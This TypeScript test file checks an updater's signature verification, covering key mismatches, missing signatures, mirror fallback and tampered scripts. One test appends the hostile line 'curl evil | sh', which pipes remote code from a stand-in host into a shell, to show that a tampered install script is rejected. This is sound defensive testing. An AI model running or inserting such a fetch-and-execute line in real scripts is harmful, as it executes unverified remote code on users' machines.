import { describe, expect, it } from 'vitest'
import { CHECKSUMS_ENV, DOWNLOADS, RELEASES, update, type UpdateDeps } from './update'
import { CHECKSUMS, INSTALL_SCRIPT } from './signed-release'
import { keyPair, releasesFetch, signedFiles, type TestPlace } from './testing/releases'

const release = keyPair()
const stranger = keyPair()

const SCRIPT = '#!/bin/sh\necho installing\n'
const SUMS = `${'b'.repeat(64)}  kettu-daemon-linux-x64.tar.gz\n`

const signed = (key = release.privateKey, version = '0.2.0') =>
  signedFiles(version, { [INSTALL_SCRIPT]: SCRIPT, [CHECKSUMS]: SUMS }, key)

const place = (files: Record<string, string>, latest = '0.2.0'): TestPlace => ({ latest, files })

function run(
  places: Record<string, TestPlace>,
  releases: string[],
  overrides: Partial<UpdateDeps> = {},
) {
  const { fetch, requests } = releasesFetch(places)
  const out: string[] = []
  const installs: { script: string; args: string[]; env: Record<string, string> }[] = []
  const done = update({
    version: '0.1.0',
    bundleDir: '/home/me/.local/share/kettu/versions/0.1.0/daemon',
    releases,
    userAgent: 'test',
    fetch,
    keys: [release.raw],
    service: true,
    foreground: false,
    install: (script, args, env) => {
      installs.push({ script, args, env })
      return Promise.resolve(0)
    },
    write: (text) => out.push(text),
    ...overrides,
  })
  return { done, out: () => out.join(''), installs, requests }
}

describe('kettu update', () => {
  it('runs the install script with the checksums it verified, pinned to the version', async () => {
    const t = run({ [DOWNLOADS]: place(signed()) }, [DOWNLOADS, RELEASES])
    await expect(t.done).resolves.toBe(0)
    expect(t.installs).toEqual([
      { script: SCRIPT, args: ['--version', '0.2.0'], env: { [CHECKSUMS_ENV]: SUMS } },
    ])
    // GitHub was never asked.
    expect(t.requests.some((url) => url.startsWith(RELEASES))).toBe(false)
  })

  it('tries the next place when the first one signs with another key', async () => {
    const t = run(
      { [DOWNLOADS]: place(signed(stranger.privateKey)), [RELEASES]: place(signed()) },
      [DOWNLOADS, RELEASES],
    )
    await expect(t.done).resolves.toBe(0)
    expect(t.out()).toMatch(/signature of .*install\.sh does not hold; it was not used; trying/)
    expect(t.installs).toHaveLength(1)
    expect(t.installs[0]?.env[CHECKSUMS_ENV]).toBe(SUMS)
  })

  it('tries the next place when a signature is missing', async () => {
    const files = signed()
    delete files[`0.2.0/${CHECKSUMS}.sig`]
    const t = run({ [DOWNLOADS]: place(files), [RELEASES]: place(signed()) }, [DOWNLOADS, RELEASES])
    await expect(t.done).resolves.toBe(0)
    expect(t.out()).toContain(`${CHECKSUMS}.sig: it answered 404`)
    expect(t.installs).toHaveLength(1)
  })

  it('never runs a script served with a changed body', async () => {
    const files = signed()
    files[`0.2.0/${INSTALL_SCRIPT}`] = `${SCRIPT}curl evil | sh\n`
    const t = run({ [DOWNLOADS]: place(files), [RELEASES]: place(files) }, [DOWNLOADS, RELEASES])
    await expect(t.done).rejects.toThrow(/does not hold/)
    expect(t.installs).toHaveLength(0)
  })

  it('fails when the one place KETTU_RELEASES_URL names does not sign its files', async () => {
    const mirror = 'https://mirror.example/releases'
    const t = run({ [mirror]: place(signed(stranger.privateKey)) }, [mirror])
    await expect(t.done).rejects.toThrow(/does not hold/)
    expect(t.installs).toHaveLength(0)
  })

  it('fails, saying why, when no place signs its files', async () => {
    const t = run({ [DOWNLOADS]: place({}), [RELEASES]: place({}) }, [DOWNLOADS, RELEASES])
    await expect(t.done).rejects.toThrow(/install\.sh: it answered 404/)
    expect(t.installs).toHaveLength(0)
  })

  it('downloads and verifies nothing when no place has a newer release', async () => {
    const t = run({ [DOWNLOADS]: place(signed(), '0.1.0') }, [DOWNLOADS])
    await expect(t.done).resolves.toBe(0)
    expect(t.out()).toContain('up to date')
    expect(t.requests.some((url) => url.includes('/download/'))).toBe(false)
  })

  it('leaves the service out of an install where none was set up', async () => {
    const t = run({ [DOWNLOADS]: place(signed()) }, [DOWNLOADS], { service: false })
    await t.done
    expect(t.installs[0]?.args).toEqual(['--version', '0.2.0', '--no-service'])
  })
})
